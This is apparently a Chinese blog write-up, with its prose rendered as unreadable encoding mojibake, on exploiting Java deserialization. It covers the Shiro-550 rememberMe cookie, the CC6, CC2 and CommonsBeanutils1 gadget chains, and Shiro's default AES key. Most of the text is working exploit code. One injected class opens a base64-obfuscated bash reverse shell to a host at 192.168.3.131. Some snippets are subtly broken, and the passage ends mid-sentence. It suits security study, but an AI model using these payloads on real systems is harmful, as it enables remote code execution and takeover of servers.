pç‰›ç»™å‡ºäº†ä¸€ä¸ªå°demoï¼Œåªæœ‰ä¸¤ä¸ªjspï¼Œä¾èµ–æœ‰è¿™äº›\nshiro-coreã€shiro-webï¼Œè¿™æ˜¯shiroæœ¬èº«çš„ä¾èµ– javax.servlet-apiã€jsp-apiï¼Œè¿™æ˜¯JSPå’ŒServletçš„ä¾èµ–ï¼Œä»…åœ¨ç¼–è¯‘é˜¶æ®µä½¿ç”¨ï¼Œå› ä¸ºTomcatä¸­è‡ªå¸¦è¿™ä¸¤ä¸ªä¾èµ– slf4j-apiã€slf4j-simpleï¼Œè¿™æ˜¯ä¸ºäº†æ˜¾ç¤ºshiroä¸­çš„æŠ¥é”™ä¿¡æ¯æ·»åŠ çš„ä¾èµ– commons-loggingï¼Œè¿™æ˜¯shiroä¸­ç”¨åˆ°çš„ä¸€ä¸ªæ¥å£ï¼Œä¸æ·»åŠ ä¼šçˆ†java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactoryé”™è¯¯ commons-collectionsï¼Œä¸ºäº†æ¼”ç¤ºååºåˆ—åŒ–æ¼æ´ï¼Œå¢åŠ äº†commons-collectionsä¾èµ–ï¼Œç‰ˆæœ¬ä¸º3.2.1 æ‰“waråŒ…åéƒ¨ç½²åœ¨æœ¬åœ°\næŠ“åŒ…å¯ä»¥çœ‹åˆ°ï¼Œä¸å‹¾é€‰Remember Meæ—¶cookieæœ‰rememberMe=deleteMeï¼Œå‹¾é€‰çš„è¯åˆ™æ˜¯\nè¿™é‡Œçš„b64åŠ å¯†ä¿¡æ¯æ˜¯AESï¼Œåœ¨org.apache.shiro.mgt.AbstractRememberMeManagerä¸­å¯ä»¥çœ‹åˆ°é»˜è®¤key\nå¯ä»¥çœ‹åˆ°å®ƒåœ¨åŒåçš„æ„é€ å‡½æ•°ä¸­è®¾ç½®äº†è¿™ä¸ªdefault keyï¼Œè€Œæ§åˆ¶cookieä¿¡æ¯org.apache.shiro.web.mgt.CookieRememberMeManagerç»§æ‰¿äº†è¿™ä¸ªç±»\nç”±äºå®ƒä½¿ç”¨äº†é»˜è®¤keyå¹¶ä¸”ç”¨äº†ccä¾èµ–ï¼Œæˆ‘ä»¬çš„æ”»å‡»è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š\nç”¨CCé“¾ç”Ÿæˆpayload ç”¨Shiroé»˜è®¤keyè¿›è¡ŒåŠ å¯† å°†å¯†æ–‡ä½œä¸ºrememberMeçš„Cookieå‘é€ç»™æœåŠ¡ç«¯ CC6ä¸ºä»€ä¹ˆä¸è¡Œ pç‰›å†™äº†ä¸€ä¸ªåŸºäºCC6çš„exp\npackage com.govuln.shiroattack; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(\u0026#34;whoami\u0026#34;); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } package com.govuln.shiroattack; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public byte[] getPayload(String command) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { command }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); // ä¸å†ä½¿ç”¨åŸCommonsCollections6ä¸­çš„HashSetï¼Œç›´æ¥ä½¿ç”¨HashMap Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;keykey\u0026#34;); Map expMap = new HashMap(); expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.remove(\u0026#34;keykey\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } } å°†ç”Ÿæˆç»“æœå‘é€ï¼Œä½†æ˜¯consoleç–¯ç‹‚æŠ¥é”™\nçœ‹åˆ°è¿™ä¸ªorg.apache.shiro.io.ClassResolvingObjectInputStreamï¼Œå®ƒé‡å†™äº†resolveClassæ–¹æ³•\npublic class ClassResolvingObjectInputStream extends ObjectInputStream { public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException var3) { throw new ClassNotFoundException(\u0026#34;Unable to load ObjectStreamClass [\u0026#34; + osc + \u0026#34;]: \u0026#34;, var3); } } } è¿™æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ï¼Œå®ƒé‡å†™äº†ObjectInputStream\nprotected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException ex) { Class\u0026lt;?\u0026gt; cl = primClasses.get(name); if (cl != null) { return cl; } else { throw ex; } } } æ³¨æ„åˆ°å‰è€…ç”¨çš„æ˜¯org.apache.shiro.util.ClassUtils#forNameï¼ˆå†…éƒ¨æ˜¯org.apache.catalina.loader.ParallelwebappClassLoader#loadClassï¼‰ï¼Œè€Œçˆ¶ç±»ç”¨çš„æ˜¯Class.forName\næˆ‘ä»¬åœ¨ä¸Šé¢çš„ä½ç½®æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼›æ³¨æ„å¦‚æœæ–­ä¸ä¸‹æ¥ï¼Œå¯ä»¥è€ƒè™‘å¾€å‰æ‰¾ä¸€æ‰¾è°ƒç”¨å…³ç³»ï¼Œæ¯”å¦‚org.apache.shiro.mgt.AbstractRememberMeManager#decryptï¼Œå®ƒæ‰§è¡Œcookieéƒ¨åˆ†çš„è§£ç ï¼Œä¸­é—´è§¦å‘ååºåˆ—åŒ–\nresolveClassä¾æ¬¡å¾—åˆ°æˆ‘ä»¬é“¾å­ä¸­çš„LazyMapç­‰ç­‰ éƒ½å¾ˆæ­£å¸¸ï¼Œé—®é¢˜å‡ºåœ¨çªç„¶å‡ºç°çš„[Lorg.apache.commons.collections.Transformer;\nclazz==nullï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œä½†å¹¶ä¸æ˜¯å› å®ƒæ˜¯[Læ ‡è®°çš„æ•°ç»„è¿™ä¸€ç‚¹å¯¼è‡´æŠ¥é”™ï¼Œå› ä¸ºåœ¨å®ƒåé¢è¿˜æœ‰fqcn=\u0026quot;[Ljava.lang.Object;\u0026quot;\nå®ƒå°±æ²¡æœ‰è¿”å›nullï¼Œåé¢è¿˜æœ‰å¥½å‡ ä¸ªéƒ½å¸¦[Læ ‡è®°çš„å¯¹è±¡ï¼Œéƒ½æ²¡æœ‰è¿”å›nullï¼Œè¿™æ ·çš„çŒœæµ‹æ˜¾ç„¶æ˜¯é”™è¯¯çš„\né‡æ–°å‘åŒ…å¹¶ç»§ç»­æ–­åœ¨loadClass\næˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨çš„ClassLoaderæ˜¯ä¸Šé¢çš„ParallelWebappClassLoaderï¼Œè€Œå®ƒçš„å·¥ä½œæ¨¡å¼å°±æ˜¯è¿™é‡Œçš„bugä¹‹å¤„\njavaè£…è½½ç±»æ—¶éµå¾ªâ€œå…¨ç›˜è´Ÿè´£å§”æ‰˜æœºåˆ¶â€ï¼Œâ€œå…¨ç›˜è´Ÿè´£â€æŒ‡çš„æ˜¯å½“ä¸€ä¸ªClassLoaderè£…è½½ä¸€ä¸ªç±»æ—¶ï¼Œé™¤éæ˜¾ç¤ºåœ°ä½¿ç”¨å¦å¤–ä¸€ä¸ªClassLoderï¼Œå¦åˆ™è¯¥ç±»æ‰€ä¾èµ–åŠå¼•ç”¨çš„ç±»ä¹Ÿç”±è¿™ä¸ªClassLoderè½½å…¥ï¼›â€œå§”æ‰˜æœºåˆ¶â€æŒ‡å…ˆå§”æ‰˜çˆ¶ç±»è£…è½½å™¨å¯»æ‰¾ç›®æ ‡ç±»ï¼Œåªæœ‰åœ¨æ‰¾ä¸åˆ°çš„æƒ…å†µä¸‹æ‰ä»è‡ªå·±çš„ç±»è·¯å¾„ä¸­æŸ¥æ‰¾å¹¶è£…è½½ç›®æ ‡ç±»ï¼Œå¯¹åº”åˆ°è¿™é‡Œï¼Œå½“å®ƒæ‰¾ä¸åˆ°æ—¶å°±ä¼šç”¨ä¸Šé¢çš„URLClassLoader\nï¼ˆç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒWeappClassLoaderé»˜è®¤ä¸é€‚ç”¨å§”æ‰˜æœºåˆ¶\næ­£å¸¸çš„classè§£æåpathæ˜¯æœ€å‰é¢åŠ /ï¼Œ.æ¢ä¸º/ï¼Œ\nä¹‹åè¿™ä¸ªå€¼ä¼šä¼ å…¥hashMapä½œä¸ºkeyï¼Œæˆ‘ä»¬ç›´æ¥åœ¨keyçš„åœ°æ–¹æ–­ï¼Œå‘ç°Transformeræ•°ç»„ä¼ å…¥ç¨æœ‰ç‚¹ç‰¹æ®Šï¼ˆæ•°ç»„éƒ½è¿™æ ·\né—®é¢˜æ˜¯å®ƒåœ¨å‰ä¸€æ­¥è°ƒç”¨çš„æ˜¯ä¸Šå±‚çš„URLClassLoaderï¼\nå¯¹ç…§å…¶å®ƒå¸¦[Lçš„å¯¹è±¡\nè¢«æ­£å¸¸è§£æ\nç»è¿‡ä¸Šé¢çš„è°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼šå½“ååºåˆ—åŒ–æµä¸­å‡ºç°éjavaè‡ªèº«çš„æ•°ç»„ï¼Œä¼šå¼•èµ·ParallelWebappClassLoaderè§¦å‘åŒäº²å§”æ‰˜æœºåˆ¶ï¼Œå°†å¯¹è±¡äº¤ç»™ä¸Šå±‚çš„URLClassLoaderè¿›è¡Œå¤„ç†ï¼Œç”±äºå‚æ•°çš„ä¸åŒ¹é…ï¼Œè‡ªç„¶å°±å‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯\næä¸ªè¡Œçš„ æ—¢ç„¶é—®é¢˜å‡ºåœ¨éjavaåŸç”Ÿçš„Transformeræ•°ç»„ä¸Šï¼Œæˆ‘ä»¬æŠŠå®ƒæ¢ä¸ºTiedMapEntryï¼Œæ„é€ å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•° Mapå’ŒKeyï¼Œå®ƒæœ‰ä¸€ä¸ªgetValueæ–¹æ³•\npublic Object getValue(){ return map.get(key); } å½“æˆ‘ä»¬å‡ºä¼ å…¥çš„mapæ˜¯LazyMapæ—¶ï¼Œè¿™ä¸ªgetå°±å¯ä»¥è§¦å‘transformçš„å›è°ƒäº†\npublic Object get(Object key){ if(map.containsKey(key) == false){ Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } å‰é¢ç”¨åˆ°getæ—¶æˆ‘ä»¬å¹¶ä¸å…³å¿ƒä¼ å…¥çš„keyï¼Œå› ä¸ºé‡ç‚¹åœ¨Transformeræ•°ç»„çš„ConstantTransformerï¼Œæˆ‘ä»¬é€šè¿‡å®ƒæ¥åˆå§‹åŒ–æ¶æ„å¯¹è±¡\nè€Œä»”ç»†çœ‹è¿™é‡Œçš„keyä¼šè¢«ä¼ å…¥transformï¼Œå®ƒå¯ä»¥æ‰®æ¼”ConstantTransformerçš„è§’è‰²\nå†å›çœ‹Transformeræ•°ç»„\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null ) }; ç¬¬äºŒè¡Œå¯ä»¥å»æ‰ï¼Œæ•°ç»„é•¿åº¦å˜ä¸º1ï¼Œæ•°ç»„ä¹Ÿä¸éœ€è¦äº†\nç¼–å†™ä¸€ä¸‹exp\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class testCC6Shiro { public byte[] getPayload(byte[] clsBytes)throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clsBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.clear();\t// åŒouterMap.clear() setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); }; public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }; } æ¶æ„ç±»\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class testCC6ShiroEvil { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public Evil() throws Exception { super(); System.out.println(\u0026#34;Hello TemplatesImpl\u0026#34;); Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}\u0026#34;); } } é€šè¿‡Client.javaè£…é…CC6Shiro\npackage ysoserial.payloads; import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class testCC6ShiroClient { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass cls = pool.get(ysoserial.payloads.testCC6ShiroEvil.class.getName()); byte[] payload = new testCC6Shiro().getPayload(cls.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } ç”±äºæˆ‘åœ¨Linuxä¸Šæµ‹è¯•ï¼Œå°±ä¸å¼¹è®¡ç®—å™¨ï¼Œç›´æ¥å¼¹shell\næ•ˆæœæ‹”ç¾¤ï¼ï¼ï¼ï¼ï¼ï¼\nè¿™ä¸€èŠ‚æˆ‘ä»¬å°†TemplatesImplå’ŒCC6ç»“åˆåœ¨ä¸€èµ·ï¼ŒåŒæ—¶è§£å†³äº†CC3é«˜ç‰ˆæœ¬åˆ©ç”¨ä¸äº†çš„é—®é¢˜\nCC2 - cc4 CCååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼Œccä¾èµ–æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒgroupIdå’ŒartifactIdéƒ½ä¸ä¸€æ ·\ncommons-collections:commons-collections org.apache.commons:commons-collection4 è¡¨ç°åœ¨æˆ‘ä»¬æ„é€ expçš„åŒºåˆ«æ˜¯å°†decorateæ”¹ä¸ºäº†LazyMap\npublic static Map decorate(Map map, Transformer factory){ return new LazyMap(map, factory); } public static \u0026lt;V, K\u0026gt; LazyMap\u0026lt;K, V\u0026gt; LazyMap(final Map\u0026lt;K, V\u0026gt; map, final Transformer\u0026lt;? super K, ? extends V\u0026gt; factory){ return new LazyMap\u0026lt;K, V\u0026gt;(map, factory); } ç›´æ¥æŠŠgadgetæ”¹ä¸€ä¸‹åå­—å³å¯ï¼›ä¸è¿‡ä¸ºäº†ä¸“é—¨é€‚é…cc4ï¼Œysoserialä¹Ÿæœ‰ä¸“é—¨çš„é“¾å­CC2å’ŒCC4\nccåŒ…ä¹‹æ‰€ä»¥èƒ½æ‰¾å‡ºè¿™ä¹ˆå¤šé“¾å­ï¼Œé™¤äº†ç›¸å½“åŸºç¡€ä»¥å¤–ï¼Œæ›´å¤šçš„åŸå› åœ¨äºå®ƒåŒ…å«äº†å¾ˆå¤šå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•çš„Transformerï¼Œæ‰€ä»¥æ‰¾é“¾å­çš„è¿‡ç¨‹ç›¸å½“äºæ‰¾ä¸€æ¡ä»Serializable#readObjectåˆ°Transformer#transformæ–¹æ³•çš„è°ƒç”¨é“¾\næˆ‘ä»¬åˆ†æä¸€ä¸‹CC2ï¼Œå®ƒç”¨åˆ°çš„å…³é”®ç±»æœ‰java.util.PriorityQueueå’Œorg.apache.commons.collections4.comparators.TransformingComparatorï¼ˆå¯é€šè¿‡comprareè°ƒç”¨transformï¼‰\njava.util.PriorityQueueé‡å†™äº†readObjectæ–¹æ³•\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify(); } heapify-\u0026gt; siftDown-\u0026gt; siftDownUsingComparator-\u0026gt; comparator.compare-\u0026gt; TransformingComparator-\u0026gt; compare-\u0026gt; transform æ„é€ poc\nimport java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; public class CC2 { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object.class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } TemplatesImpl æŠŠexpæ”¹é€ ä¸ºTemplatesImplçš„æ— transformeræ•°ç»„ç‰ˆ\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections2TemplatesImpl { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } protected static byte[] getBytescode() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName()); return clazz.toBytecode(); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{getBytescode()}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, null, null); Comparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(obj); queue.add(obj); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } ä¿®å¤ è¿™æ¡CC2æ˜¯cc4é™å®šï¼Œå› ä¸ºorg.apache.commons.collections4.comparators.TransformingComparatoråœ¨ä¹‹å‰ç‰ˆæœ¬æ˜¯æ²¡æœ‰Serializableæ¥å£çš„ï¼Œæ— æ³•åœ¨åºåˆ—åŒ–ä¸­ä½¿ç”¨\nåœ¨cc3.2.2ç‰ˆä¸­é€šè¿‡æ·»åŠ FunctorUtils#checkUnsafeSerializationæ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®org.apache.commons.collections.enableUnsafeSerialization=trueï¼Œä¼šæŠ›å‡ºå¼‚å¸¸\nè¿™ä¸ªæ£€æŸ¥åœ¨å¸¸è§çš„å±é™©Transformerç±»ï¼ˆInstantiate, Invoker, Prototype, CloneTransformerï¼‰é‡Œçš„readObjectè°ƒç”¨\nåœ¨cc4.1ç‰ˆä¸­ï¼Œè¿™å‡ ä¸ªç±»æ²¡æœ‰Serializableæ¥å£ï¼Œå½»åº•æ— æ³•åºåˆ—åŒ–äº†\nCB1 Commons Beanutilsï¼Œé¡¾åæ€ä¹‰å°è£…äº†å¯¹java beançš„ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œæ¯”å¦‚å¯ä»¥ç›´æ¥è°ƒç”¨java beançš„getteræ–¹æ³•\nPropertyUtils.getProperty(new Cat(), \u0026#34;name\u0026#34;); è¿™é‡Œä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±æ€§çš„æ–¹æ³•ï¼Œå³getNameï¼Œé™¤æ­¤ä¹‹å¤–è¿™ä¸ªæ–¹æ³•è¿˜æ”¯æŒé€’å½’è·å–å±æ€§\nåœ¨ä¸Šé¢çš„CC2ä¸­æˆ‘ä»¬ä½¿ç”¨äº†PriorityQueueï¼Œåœ¨å®ƒçš„æ’åºä¸­æ¶‰åŠåˆ°Comparatoræ¥å£çš„compareæ–¹æ³•ï¼Œæœ€åè§¦å‘transformï¼Œåœ¨CBä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ªå¯åˆ©ç”¨çš„Comparatorå¯¹è±¡ï¼ŒBeanComparator\npublic int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\u0026#34;IllegalAccessException: \u0026#34; + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\u0026#34;InvocationTargetException: \u0026#34; + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\u0026#34;NoSuchMethodException: \u0026#34; + var7.toString()); } } } ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœpropertyä¸ºç©ºåˆ™ç›´æ¥æ¯”è¾ƒå¯¹è±¡ï¼Œå¦åˆ™ç”¨getPropertyå–å‡ºå±æ€§æ¯”è¾ƒï¼Œè°ƒç”¨å¯¹è±¡çš„getter\nå›æƒ³å½“æ—¶TemplatesImplçš„è°ƒç”¨é“¾\nTemplateImpl#getOutputProperties\tpublic -\u0026gt; TemplateImpl#newTransformer\tpublic -\u0026gt; TemplateImpl#getTransletInstance -\u0026gt; TemplateImpl#defineTransletClasses -\u0026gt; TemplateImpl#defineClass\tdefault æ³¨æ„åˆ°getOutputPropertiesï¼Œæ˜¯è§¦å‘åé¢çš„å…³é”®\npublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); }catch (TransformerConfigurationException e) { return null; } } å®ƒå°±æ˜¯ä¸€ä¸ªgetterï¼è·Ÿå‰é¢çš„ç»“åˆèµ·æ¥\nPropertyUtils.getProperty(o1, \u0026#34;outputProperties\u0026#34;); å½“o1ä¸ºTemplatesImplå¯¹è±¡æ—¶ï¼Œå°±ä¼šè°ƒç”¨getOutputProperties\næ„é€ é“¾å­\nimport java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; public class CommonsBeanutils1 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{ ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode() }); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); // stub data for replacement later queue.add(1); queue.add(1); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } Shiro-550(æ— cc shiroæœ¬èº«çš„ä¾èµ–æ˜¯æœ‰cbçš„ï¼Œä½†æ˜¯ä¼šå› ä¸ºserialVersionUIDä¸ç¬¦è€ŒæŠ¥é”™ï¼Œå³ä½¿æˆ‘ä»¬è°ƒå¯¹ç”Ÿæˆpayloadçš„æœ¬åœ°ä¾èµ–ç‰ˆæœ¬å’Œç›®æ ‡ç¯å¢ƒä¸€è‡´ä¹Ÿä¼šå‡ºç°ccä¾èµ–ç‰ˆæœ¬ä¸å¯¹çš„æƒ…å†µï¼Œæˆ‘ä»¬è®¾æƒ³ä¸€æ¡æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾\nåœ¨BeanComparatorçš„æ„é€ å‡½æ•°å¤„ï¼Œæ²¡æœ‰æ˜¾å¼ä¼ å…¥Comparatoræ—¶é»˜è®¤ä½¿ç”¨ccä¸­çš„ComparableComparatorï¼Œæ›¿ä»£ç±»éœ€è¦æ»¡è¶³è¿™æ 